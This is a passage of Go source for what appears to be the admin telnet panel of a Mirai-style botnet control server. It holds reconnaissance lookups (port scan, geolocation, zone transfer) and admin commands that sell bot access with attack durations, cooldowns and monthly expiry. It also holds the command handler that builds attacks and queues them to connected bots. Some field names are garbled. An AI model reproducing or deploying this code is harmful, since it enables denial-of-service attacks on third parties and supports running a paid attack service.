			   

        if err != nil || cmd == "tracer" || cmd == "TRACER" {                  
            this.conn.Write([]byte("\x1b[96mIP Address\x1b[97m: \x1b[97m"))
            locipaddress, err := this.ReadLine(false)
            if err != nil {
                return
            }
            url := "https://api.hackertarget.com/mtr/?q=" + locipaddress
            tr := &http.Transport {
                ResponseHeaderTimeout: 60*time.Second,
                DisableCompression: true,
            }
            client := &http.Client{Transport: tr, Timeout: 60*time.Second}
            locresponse, err := client.Get(url)
            if err != nil {
                this.conn.Write([]byte(fmt.Sprintf("\033[91mError IP address or host name only\033[37;1m\r\n")))
                continue
            }
            locresponsedata, err := ioutil.ReadAll(locresponse.Body)
            if err != nil {
                this.conn.Write([]byte(fmt.Sprintf("\033[96mError IP address or host name only\033[37;1m\r\n")))
                continue
            }
            locrespstring := string(locresponsedata)
            locformatted := strings.Replace(locrespstring, "\n", "\r\n", -1)
            this.conn.Write([]byte("\x1b[96mResponse\x1b[97m: \r\n\x1b[97m" + locformatted + "\r\n"))
            			            continue
        }
			
			 if err != nil || cmd == "HIDDEN" || cmd == "hidden" {                  
            this.conn.Write([]byte("\x1b[96mIP Address\x1b[97m: \x1b[97m"))
            locipaddress, err := this.ReadLine(false)
            if err != nil {
                return
            }
            url := "https://api.hackertarget.com/pagelinks/?q=" + locipaddress
            tr := &http.Transport {
                ResponseHeaderTimeout: 60*time.Second,
                DisableCompression: true,
            }
            client := &http.Client{Transport: tr, Timeout: 60*time.Second}
            locresponse, err := client.Get(url)
            if err != nil {
                this.conn.Write([]byte(fmt.Sprintf("\033[92mError IP address or host name only\033[37;1m\r\n")))
                continue
            }
            locresponsedata, err := ioutil.ReadAll(locresponse.Body)
            if err != nil {
                this.conn.Write([]byte(fmt.Sprintf("\033[96mError IP address or host name only\033[37;1m\r\n")))
                continue
            }
            locrespstring := string(locresponsedata)
            locformatted := strings.Replace(locrespstring, "\n", "\r\n", -1)
            this.conn.Write([]byte("\x1b[96mResponse\x1b[97m: \r\n\x1b[97m" + locformatted + "\r\n"))
            			            continue
        }
			

        if err != nil || cmd == "resolve" || cmd == "RESOLVE" {                  
            this.conn.Write([]byte("\x1b[96mWebsite (Without www.)\x1b[97m: \x1b[97m"))
            locipaddress, err := this.ReadLine(false)
            if err != nil {
                return
            }
            url := "https://api.hackertarget.com/hostsearch/?q=" + locipaddress
            tr := &http.Transport {
                ResponseHeaderTimeout: 15*time.Second,
                DisableCompression: true,
            }
            client := &http.Client{Transport: tr, Timeout: 15*time.Second}
            locresponse, err := client.Get(url)
            if err != nil {
                this.conn.Write([]byte(fmt.Sprintf("\033[91mError IP address or host name only\033[37;1m\r\n")))
                continue
            }
            locresponsedata, err := ioutil.ReadAll(locresponse.Body)
            if err != nil {
                this.conn.Write([]byte(fmt.Sprintf("\033[91mError IP address or host name only\033[37;1m\r\n")))
                continue
            }
            locrespstring := string(locresponsedata)
            locformatted := strings.Replace(locrespstring, "\n", "\r\n", -1)
            this.conn.Write([]byte("\x1b[96mResponse\x1b[97m: \r\n\x1b[97m" + locformatted + "\r\n"))
            			            continue
        }
			 if err != nil || cmd == "GEOIP" || cmd == "geoip" {                  
            this.conn.Write([]byte("         " + yellow + "IP" + white + "/" + yellow + "URL " + white + "(" + yellow + "Ex: " + grey + "1.3.3.7 " + white + ", " + grey + "pornhub.com" + white + ")" + white + ":" + white + " "))
			address, err := this.ReadLine(false)
			if err != nil {
				return
			}
			response, err = http.Get("http://ip-api.com/json/" + address + "")
			if err != nil {
				fmt.Println(err)
			}
			defer response.Body.Close()
			body, err = ioutil.ReadAll(response.Body)
			if err != nil {
				fmt.Println(err)
			}
			err = json.Unmarshal(body, &geo)
			if err != nil {
				fmt.Println(err)
			}
			this.conn.Write([]byte("         " + yellow + " メ " + white + "Info Retrieved " + yellow + "メ\r\n"))
			this.conn.Write([]byte(fmt.Sprintf(""+yellow+"Status "+grey+"- \t%s\r\n", geo.Status)))
			this.conn.Write([]byte(fmt.Sprintf(""+yellow+"ry "+grey+"- \t%s\r\n", geo.ry)))
			this.conn.Write([]byte(fmt.Sprintf(""+yellow+"ry Code "+grey+"- \t%s\r\n", geo.ryCode)))
			this.conn.Write([]byte(fmt.Sprintf(""+yellow+"Region "+grey+"- \t%s\r\n", geo.Region)))
			this.conn.Write([]byte(fmt.Sprintf(""+yellow+"State "+grey+"- \t%s\r\n", geo.RegionName)))
			this.conn.Write([]byte(fmt.Sprintf(""+yellow+"City "+grey+"- \t\t%s\r\n", geo.City)))
			this.conn.Write([]byte(fmt.Sprintf(""+yellow+"ZIP "+grey+"- \t\t%s\r\n", geo.Zip)))
			this.conn.Write([]byte(fmt.Sprintf(""+yellow+"ISP "+grey+"- \t\t%s\r\n", geo.Isp)))
			this.conn.Write([]byte(fmt.Sprintf(""+yellow+"Organization "+grey+"- \t%s\r\n", geo.Org)))
			this.conn.Write([]byte(fmt.Sprintf(""+yellow+"AS "+grey+"- \t\t%s\r\n", geo.AS)))
			this.conn.Write([]byte(fmt.Sprintf(""+yellow+"Timezone "+grey+"- \t%s\r\n", geo.Timezone)))
			this.conn.Write([]byte(fmt.Sprintf(""+yellow+"Mobile? "+grey+"- \t%t\r\n", geo.Mobile)))
			this.conn.Write([]byte(fmt.Sprintf(""+yellow+"Proxy? "+grey+"- \t%t\r\n", geo.Proxy)))
			continue
        }
		if userInfo.admin >= 1 && cmd == ".reactivate" {
		this.conn.Write([]byte("         Client Name: "))
		user, err := this.ReadLine(false)
		if err != nil {
			this.conn.Write([]byte(fmt.Sprintf("%s\033[0m\r\n", "An unknown error occurred.")))
			continue
		}
		this.conn.Write([]byte("         New maximum month:: "))
		new_max_month_str, err := this.ReadLine(false)
		if err != nil {
			this.conn.Write([]byte(fmt.Sprintf("%s\033[0m\r\n", "An unknown error occurred.")))
			continue
		}
		this.conn.Write([]byte("         New maximum day:: "))
		new_max_day_str, err := this.ReadLine(false)
		if err != nil {
			this.conn.Write([]byte(fmt.Sprintf("%s\033[0m\r\n", "An unknown error occurred.")))
			continue
		}
		this.conn.Write([]byte("         New maximum year:: "))
		new_max_year_str, err := this.ReadLine(false)
		if err != nil {
			this.conn.Write([]byte(fmt.Sprintf("%s\033[0m\r\n", "An unknown error occurred.")))
			continue
		}

		new_max_day, err := strconv.Atoi(new_max_day_str)
		if err != nil {
			this.conn.Write([]byte(fmt.Sprintf("%s\033[0m\r\n", "An unknown error occurred.")))
			continue
		}
		new_max_month, err := strconv.Atoi(new_max_month_str)
		if err != nil {
			this.conn.Write([]byte(fmt.Sprintf("%s\033[0m\r\n", "An unknown error occurred.")))
			continue
		}
		new_max_year, err := strconv.Atoi(new_max_year_str)
		if err != nil {
			this.conn.Write([]byte(fmt.Sprintf("%s\033[0m\r\n", "An unknown error occurred.")))
			continue
		}

		if !database.MaxDateDay(user, new_max_day) {
			this.conn.Write([]byte(fmt.Sprintf("%s\033[0m\r\n", "Failed to redefine the new date. An unknown error occurred.")))
		} else if !database.MaxDateMonth(user, new_max_month) {
			this.conn.Write([]byte(fmt.Sprintf("%s\033[0m\r\n", "Failed to redefine the new date. An unknown error occurred.")))
		} else if !database.MaxDateYear(user, new_max_year) {
			this.conn.Write([]byte(fmt.Sprintf("%s\033[0m\r\n", "Failed to redefine the new date. An unknown error occurred.")))
		} else {
			this.conn.Write([]byte("         New redefined date added successfully.\033[0m\r\n"))
		}

		continue
	}
	if userInfo.admin >= 1 && cmd == ".addmonth" {
		this.conn.Write([]byte("         Client Name: "))
		user, err := this.ReadLine(false)
		if err != nil {
			return
		}
		new_max_month := database.FetchMonth(user)
		new_max_year := database.FetchYear(user)

		if new_max_month == 12 {
			new_max_month = 1
			new_max_year += 1
		} else {
			new_max_month += 1
		}

		if !database.MaxDateMonth(user, new_max_month) {
			this.conn.Write([]byte(fmt.Sprintf("%s\033[0m\r\n", "Failed to redefine the new date. An unknown error occurred.")))
		} else if !database.MaxDateYear(user, new_max_year) {
			this.conn.Write([]byte(fmt.Sprintf("%s\033[0m\r\n", "Failed to redefine the new date. An unknown error occurred.")))
		} else {
			this.conn.Write([]byte("         New redefined date added successfully.\033[0m\r\n"))
		}

		continue
    }
    if userInfo.admin >= 1 && cmd == ".kickall" || userInfo.admin >= 1 && cmd == "kickall"  {
        database.Kickall()
        this.conn.Write([]byte("         " + white + "Succesfully kicked everyone bye!!\r\n"))
        continue
    }
    
    if userInfo.admin >= 1 && cmd == ".kick" || userInfo.admin >= 1 && cmd == "kick"  {
         
         
        this.conn.Write([]byte("\r\n"))
        this.conn.Write([]byte("\r\n"))
        this.conn.Write([]byte("\r\n"))
        this.conn.Write([]byte("\r\n"))
        this.conn.Write([]byte("\r\n"))
        this.conn.Write([]byte("\r\n"))
        this.conn.Write([]byte("\r\n"))
        this.conn.Write([]byte("\r\n"))
        this.conn.Write([]byte("         " + yellow + "╔═══════════════════════════════════════════════════════════╗\r\n"))
        this.conn.Write([]byte("         " + yellow + "║                    Username"+white+":                              "+yellow+"║\r\n"))
        this.conn.Write([]byte("         " + yellow + "╚═══════════════════════════════════════════════════════════╝\r\n"))
        this.conn.Write([]byte(MoveCursorYX("10", "40")))
        kickuser, err := this.ReadLine(false)
        if err != nil {
            return
        }
        if !database.Kick(kickuser){
            this.conn.Write([]byte("         " + white + "Error, can't kick the person\r\n"))
            continue
        }
        this.conn.Write([]byte("\r\n"))
        this.conn.Write([]byte("         " + white + "Succesfully kicked user bye!!\r\n"))
        continue
    }
			 if err != nil || cmd == "portscan" || cmd == "PORTSCAN" {                  
            this.conn.Write([]byte("\x1b[95m IPV4 )\x1b[97m: \x1b[97m"))
            locipaddress, err := this.ReadLine(false)
            if err != nil {
                return
            }
           url := "https://api.hackertarget.com/nmap/?q=" + locipaddress
            tr := &http.Transport {
                ResponseHeaderTimeout: 15*time.Second,
                DisableCompression: true,
            }
            client := &http.Client{Transport: tr, Timeout: 15*time.Second}
            locresponse, err := client.Get(url)
            if err != nil {
                this.conn.Write([]byte(fmt.Sprintf("\033[91mError IP address or host name only\033[37;1m\r\n")))
                continue
            }
            locresponsedata, err := ioutil.ReadAll(locresponse.Body)
            if err != nil {
                this.conn.Write([]byte(fmt.Sprintf("\033[91mError IP address or host name only\033[37;1m\r\n")))
                continue
            }
            locrespstring := string(locresponsedata)
            locformatted := strings.Replace(locrespstring, "\n", "\r\n", -1)
            this.conn.Write([]byte("\x1b[96mResponse\x1b[97m: \r\n\x1b[97m" + locformatted + "\r\n"))
            			            continue
        }
				    if err != nil || cmd == "geoip" || cmd == "" {
            this.conn.Write([]byte("\x1b[1;33mIPv4\x1b[1;36m: \x1b[0m"))
            locipaddress, err := this.ReadLine(false)
            if err != nil {
                return
            }
            url := "http://ip-api.com/line/" + locipaddress
            tr := &http.Transport {
                ResponseHeaderTimeout: 5*time.Second,
                DisableCompression: true,
            }
            client := &http.Client{Transport: tr, Timeout: 5*time.Second}
            locresponse, err := client.Get(url)
            if err != nil {
                this.conn.Write([]byte(fmt.Sprintf("\033[31mAn Error Occured! Please try again Later.\033[37;1m\r\n")))
                continue
            }
            locresponsedata, err := ioutil.ReadAll(locresponse.Body)
            if err != nil {
                this.conn.Write([]byte(fmt.Sprintf("\033[31mAn Error Occured! Please try again Later.\033[37;1m\r\n")))
                continue
            }
            locrespstring := string(locresponsedata)
            locformatted := strings.Replace(locrespstring, "\n", "\r\n", -1)
            this.conn.Write([]byte("\x1b[1;33mResults\x1b[1;36m: \r\n\x1b[1;36m" + locformatted + "\x1b[0m\r\n"))
        }
		            if err != nil || cmd == "revdns" || cmd == "REVDNS" {
            this.conn.Write([]byte("\x1b[96mIP Address\x1b[97m: \x1b[97m"))
            locipaddress, err := this.ReadLine(false)
            if err != nil {
                return
            }
            url := "https://api.hackertarget.com/reverseiplookup/?q=" + locipaddress
            tr := &http.Transport {
                ResponseHeaderTimeout: 5*time.Second,
                DisableCompression: true,
            }
            client := &http.Client{Transport: tr, Timeout: 5*time.Second}
            locresponse, err := client.Get(url)
            if err != nil {
                this.conn.Write([]byte(fmt.Sprintf("\033[91mError IP address or host name only\033[37;1m\r\n")))
                continue
            }
            locresponsedata, err := ioutil.ReadAll(locresponse.Body)
            if err != nil {
                this.conn.Write([]byte(fmt.Sprintf("\033[91mError IP address or host name only\033[37;1m\r\n")))
                continue
            }
            locrespstring := string(locresponsedata)
            locformatted := strings.Replace(locrespstring, "\n", "\r\n", -1)
            this.conn.Write([]byte("\x1b[96mResponse\x1b[97m: \r\n\x1b[97m" + locformatted + "\r\n"))
                        continue
            }
             
            if err != nil || cmd == "asnlookup" || cmd == "asnlookup" {
            this.conn.Write([]byte("\x1b[96mIP Address\x1b[97m: \x1b[97m"))
            locipaddress, err := this.ReadLine(false)
            if err != nil {
                return
            }
            url := "https://api.hackertarget.com/aslookup/?q=" + locipaddress
            tr := &http.Transport {
                ResponseHeaderTimeout: 15*time.Second,
                DisableCompression: true,
            }
            client := &http.Client{Transport: tr, Timeout: 15*time.Second}
            locresponse, err := client.Get(url)
            if err != nil {
                this.conn.Write([]byte(fmt.Sprintf("\033[91mError IP address or host name only\033[37;1m\r\n")))
                continue
            }
            locresponsedata, err := ioutil.ReadAll(locresponse.Body)
            if err != nil {
                this.conn.Write([]byte(fmt.Sprintf("\033[91mError IP address or host name only\033[37;1m\r\n")))
                continue
            }
            locrespstring := string(locresponsedata)
            locformatted := strings.Replace(locrespstring, "\n", "\r\n", -1)
            this.conn.Write([]byte("\x1b[96mResponse\x1b[97m: \r\n\x1b[97m" + locformatted + "\r\n"))
                            continue
            }
                 
            if err != nil || cmd == "subcalc" || cmd == "SUBCALC" {
            this.conn.Write([]byte("\x1b[96mIP Address\x1b[97m: \x1b[97m"))
            locipaddress, err := this.ReadLine(false)
            if err != nil {
                return
            }
            url := "https://api.hackertarget.com/subnetcalc/?q=" + locipaddress
            tr := &http.Transport {
                ResponseHeaderTimeout: 5*time.Second,
                DisableCompression: true,
            }
            client := &http.Client{Transport: tr, Timeout: 5*time.Second}
            locresponse, err := client.Get(url)
            if err != nil {
                this.conn.Write([]byte(fmt.Sprintf("\033[91mError IP address or host name only\033[37;1m\r\n")))
                continue
            }
            locresponsedata, err := ioutil.ReadAll(locresponse.Body)
            if err != nil {
                this.conn.Write([]byte(fmt.Sprintf("\033[91mError IP address or host name only\033[37;1m\r\n")))
                continue
            }
            locrespstring := string(locresponsedata)
            locformatted := strings.Replace(locrespstring, "\n", "\r\n", -1)
            this.conn.Write([]byte("\x1b[96mResponse\x1b[97m: \r\n\x1b[97m" + locformatted + "\r\n"))
                            continue
            }
             
            if err != nil || cmd == "ztransf" || cmd == "ZTRANSF" {
            this.conn.Write([]byte("\x1b[94mIP Address Or Website (Without www.)\x1b[0m: \x1b[94m"))
            locipaddress, err := this.ReadLine(false)
            if err != nil {
                return
            }
            url := "https://api.hackertarget.com/zonetransfer/?q=" + locipaddress
            tr := &http.Transport {
                ResponseHeaderTimeout: 15*time.Second,
                DisableCompression: true,
            }
            client := &http.Client{Transport: tr, Timeout: 15*time.Second}
            locresponse, err := client.Get(url)
            if err != nil {
                this.conn.Write([]byte(fmt.Sprintf("\033[93mError IP address or host name only\033[37;1m\r\n")))
                continue
            }
            locresponsedata, err := ioutil.ReadAll(locresponse.Body)
            if err != nil {
                this.conn.Write([]byte(fmt.Sprintf("\033[92mError IP address or host name only\033[37;1m\r\n")))
                continue
            }
            locrespstring := string(locresponsedata)
            locformatted := strings.Replace(locrespstring, "\n", "\r\n", -1)
            this.conn.Write([]byte("\x1b[96mResponse\x1b[97m: \r\n\x1b[97m" + locformatted + "\r\n"))
            }
			

        botCount = userInfo.maxBots

        if userInfo.admin == 1 && cmd == "adduser" {
            this.conn.Write([]byte("\033[0mUsername:\033[01;37m "))
            new_un, err := this.ReadLine(false)
            if err != nil {
                return
            }
            this.conn.Write([]byte("\033[0mPassword:\033[01;37m "))
            new_pw, err := this.ReadLine(false)
            if err != nil {
                return
            }
            this.conn.Write([]byte("\033[0mBotcount\033[01;37m(\033[0m-1 for access to all\033[01;37m)\033[0m:\033[01;37m "))
            max_bots_str, err := this.ReadLine(false)
            if err != nil {
                return
            }
            max_bots, err := strconv.Atoi(max_bots_str)
            if err != nil {
                this.conn.Write([]byte(fmt.Sprintf("\033[31;1m%s\033[0m\r\n", "Failed to parse the bot count")))
                continue
            }
            this.conn.Write([]byte("\033[0mAttack Duration\033[01;37m(\033[0m-1 for none\033[01;37m)\033[0m:\033[01;37m "))
            duration_str, err := this.ReadLine(false)
            if err != nil {
                return
            }
            duration, err := strconv.Atoi(duration_str)
            if err != nil {
                this.conn.Write([]byte(fmt.Sprintf("\033[31;1m%s\033[0m\r\n", "Failed to parse the attack duration limit")))
                continue
            }
            this.conn.Write([]byte("\033[0mCooldown\033[01;37m(\033[0m0 for none\033[01;37m)\033[0m:\033[01;37m "))
            cooldown_str, err := this.ReadLine(false)
            if err != nil {
                return
            }
            cooldown, err := strconv.Atoi(cooldown_str)
            if err != nil {
                this.conn.Write([]byte(fmt.Sprintf("\033[31;1m%s\033[0m\r\n", "Failed to parse the cooldown")))
                continue
            }
            this.conn.Write([]byte("\033[0m- New user info - \r\n- Username - \033[01;37m" + new_un + "\r\n\033[0m- Password - \033[01;37m" + new_pw + "\r\n\033[0m- Bots - \033[01;37m" + max_bots_str + "\r\n\033[0m- Max Duration - \033[01;37m" + duration_str + "\r\n\033[0m- Cooldown - \033[01;37m" + cooldown_str + "   \r\n\033[0mContinue? \033[01;37m(\033[01;32my\033[01;37m/\033[01;31mn\033[01;37m) "))
            confirm, err := this.ReadLine(false)
            if err != nil {
                return
            }
            if confirm != "y" {
                continue
            }
            if !database.CreateBasic(new_un, new_pw, max_bots, duration, cooldown) {
                this.conn.Write([]byte(fmt.Sprintf("\033[31;1m%s\033[0m\r\n", "Failed to create new user. An unknown error occured.")))
            } else {
                this.conn.Write([]byte("\033[32;1mUser added successfully.\033[0m\r\n"))
					new_max_month := current_month_now
					new_max_year := current_year_now

					if new_max_month == 12 {
						new_max_month = 1
						new_max_year += 1
					} else {
						new_max_month += 1
					}

					database.MaxDateDay(new_un, current_day_now)
					database.MaxDateMonth(new_un, new_max_month)
					database.MaxDateYear(new_un, new_max_year)

            }
			
            continue
        }

        if userInfo.admin == 1 && cmd == "!remove" {
            this.conn.Write([]byte("\033[01;37mUsername: \033[0;35m"))
            rm_un, err := this.ReadLine(false)
            if err != nil {
                return
             }
            this.conn.Write([]byte(" \033[01;37mAre You Sure You Want To Remove \033[01;37m" + rm_un + "?\033[01;37m(\033[01;32my\033[01;37m/\033[01;31mn\033[01;37m) "))
            confirm, err := this.ReadLine(false)
            if err != nil {
                return
            }
            if confirm != "y" {
                continue
            }
            if !database.RemoveUser(rm_un) {
            this.conn.Write([]byte(fmt.Sprintf("\033[01;31mUnable to remove users\r\n")))
            } else {
                this.conn.Write([]byte("\033[01;32mUser Successfully Removed!\r\n"))
            }
            continue
        }

        botCount = userInfo.maxBots

        if userInfo.admin == 1 && cmd == ".admin" {
            this.conn.Write([]byte("\033[0mUsername:\033[01;37m "))
            new_un, err := this.ReadLine(false)
            if err != nil {
                return
            }
            this.conn.Write([]byte("\033[0mPassword:\033[01;37m "))
            new_pw, err := this.ReadLine(false)
            if err != nil {
                return
            }
            this.conn.Write([]byte("\033[0mBotcount\033[01;37m(\033[0m-1 for access to all\033[01;37m)\033[0m:\033[01;37m "))
            max_bots_str, err := this.ReadLine(false)
            if err != nil {
                return
            }
            max_bots, err := strconv.Atoi(max_bots_str)
            if err != nil {
                this.conn.Write([]byte(fmt.Sprintf("\033[31;1m%s\033[0m\r\n", "Failed to parse the bot count")))
                continue
            }
            this.conn.Write([]byte("\033[0mAttack Duration\033[01;37m(\033[0m-1 for none\033[01;37m)\033[0m:\033[01;37m "))
            duration_str, err := this.ReadLine(false)
            if err != nil {
                return
            }
            duration, err := strconv.Atoi(duration_str)
            if err != nil {
                this.conn.Write([]byte(fmt.Sprintf("\033[31;1m%s\033[0m\r\n", "Failed to parse the attack duration limit")))
                continue
            }
            this.conn.Write([]byte("\033[0mCooldown\033[01;37m(\033[0m0 for none\033[01;37m)\033[0m:\033[01;37m "))
            cooldown_str, err := this.ReadLine(false)
            if err != nil {
                return
            }
            cooldown, err := strconv.Atoi(cooldown_str)
            if err != nil {
                this.conn.Write([]byte(fmt.Sprintf("\033[31;1m%s\033[0m\r\n", "Failed to parse the cooldown")))
                continue
            }
            this.conn.Write([]byte("\033[0m- New user info - \r\n- Username - \033[01;37m" + new_un + "\r\n\033[0m- Password - \033[01;37m" + new_pw + "\r\n\033[0m- Bots - \033[01;37m" + max_bots_str + "\r\n\033[0m- Max Duration - \033[01;37m" + duration_str + "\r\n\033[0m- Cooldown - \033[01;37m" + cooldown_str + "   \r\n\033[0mContinue? \033[01;37m(\033[01;32my\033[01;37m/\033[01;31mn\033[01;37m) "))
            confirm, err := this.ReadLine(false)
            if err != nil {
                return
            }
            if confirm != "y" {
                continue
            }
            if !database.CreateAdmin(new_un, new_pw, max_bots, duration, cooldown) {
                this.conn.Write([]byte(fmt.Sprintf("\033[31;1m%s\033[0m\r\n", "Failed to create new user. An unknown error occured.")))
            } else {
                this.conn.Write([]byte("\033[32;1mUser added successfully.\033[0m\r\n"))
            }
            continue
        }
        if err != nil || cmd == ".online" && userInfo.admin >= 1|| cmd == "online" && userInfo.admin >= 1{

			all_users_connected := database.readconnected()
			

			this.conn.Write([]byte("" + yellow + "O N L I N E  U S E R S                 \r\n"))
			

			for user_conn := range all_users_connected {

				if (all_users_connected[user_conn] != "") {
					this.conn.Write([]byte(""+white+""+ yellow +" connected" +white +": \t"+white + all_users_connected[user_conn] + "\r\n"))
				}
		
			}
			this.conn.Write([]byte(fmt.Sprintf(""+white+"Total"+white+": "+yellow+"["+grey+"%d"+yellow+"]\r\n", users_connected)))


			continue
		}

        if userInfo.admin == 1 && cmd == "bots" {
            m := clientList.Distribution()
            for k, v := range m {
                t := time.Now()
                this.conn.Write([]byte(fmt.Sprintf("\033[0;35m"+t.Format("Mon Jan 2 \033[0;31m2006 \033[1;91m 15:04:05")+" \033[0;36m|\033[1;32m ↔ %s:\t%d\033[0m\r\n", k, v)))
            }
            continue
        }
        if cmd[0] == '-' {
            countSplit := strings.SplitN(cmd, " ", 2)
            count := countSplit[0][1:]
            botCount, err = strconv.Atoi(count)
            if err != nil {
                this.conn.Write([]byte(fmt.Sprintf("\033[31;1mFailed to parse botcount \"%s\"\033[0m\r\n", count)))
                continue
            }
            if userInfo.maxBots != -1 && botCount > userInfo.maxBots {
                this.conn.Write([]byte(fmt.Sprintf("\033[31;1mBot count to send is bigger then allowed bot maximum\033[0m\r\n")))
                continue
            }
            cmd = countSplit[1]
        }
        if userInfo.admin == 1 && cmd[0] == '@' {
            cataSplit := strings.SplitN(cmd, " ", 2)
            botCatagory = cataSplit[0][1:]
            cmd = cataSplit[1]
        }

        atk, err := NewAttack(cmd, userInfo.admin)
        if err != nil {
            this.conn.Write([]byte(fmt.Sprintf("\033[31;1m%s\033[0m\r\n", err.Error())))
        } else {
            buf, err := atk.Build()
            if err != nil {
                this.conn.Write([]byte(fmt.Sprintf("\033[31;1m%s\033[0m\r\n", err.Error())))
            } else {
                if can, err := database.CanLaunchAttack(username, atk.Duration, cmd, botCount, 0); !can {
                    this.conn.Write([]byte(fmt.Sprintf("\033[31;1m%s\033[0m\r\n", err.Error())))
                } else if !database.ContainsWhitelistedTargets(atk) {
                    clientList.QueueBuf(buf, botCount, botCatagory, username)
                    var YotCount int
                    if clientList.Count() > userInfo.maxBots && userInfo.maxBots != -1 {
                        YotCount = userInfo.maxBots
                    } else {
                        YotCount = clientList.Count()
                    }
					fmt.Println("with command:" + cmd + "\n")
					this.conn.Write([]byte("\033[2J\033[1;1H"))
					this.conn.Write([]byte("\033]0 [+]Attack Sent[+] \007"))
                    fmt.Println("with command:" + cmd + "\n")
                    this.conn.Write([]byte(fmt.Sprintf("\033[4;34m[+] \033[4;31m Attack\033[4;35m sent\033[4;33m with \033[4;37m%d \033[4;32mbots\r\n", YotCount)))
                } else {
                    fmt.Println("Blocked attack by " + username + " to whitelisted prefix")
                }
            }
        }
    }
}

func (this *Admin) ReadLine(masked bool) (string, error) {
    buf := make([]byte, 1024)
    bufPos := 0

    for {
        n, err := this.conn.Read(buf[bufPos:bufPos+1])
        if err != nil || n != 1 {
            return "", err
        }
        if buf[bufPos] == '\xFF' {
            n, err := this.conn.Read(buf[bufPos:bufPos+2])
            if err != nil || n != 2 {
                return "", err
            }
            bufPos--
        } else if buf[bufPos] == '\x7F' || buf[bufPos] == '\x08' {
            if bufPos > 0 {
                this.conn.Write([]byte(string(buf[bufPos])))
                bufPos--
            }
            bufPos--
        } else if buf[bufPos] == '\r' || buf[bufPos] == '\t' || buf[bufPos] == '\x09' {
            bufPos--
        } else if buf[bufPos] == '\n' || buf[bufPos] == '\x00' {
            this.conn.Write([]byte("\r\n"))
            return string(buf[:bufPos]), nil
        } else if buf[bufPos] == 0x03 {
            this.conn.Write([]byte("^C\r\n"))
            return "", nil
        } else {
            if buf[bufPos] == '\033' {
                buf[bufPos] = '^';
                this.conn.Write([]byte(string(buf[bufPos])))
                bufPos++;
                buf[bufPos] = '[';
                this.conn.Write([]byte(string(buf[bufPos])))
            } else if masked {
                this.conn.Write([]byte("*"))
            } else {
                this.conn.Write([]byte(string(buf[bufPos])))
            }
        }
        bufPos++
    }
    return string(buf), nil
}
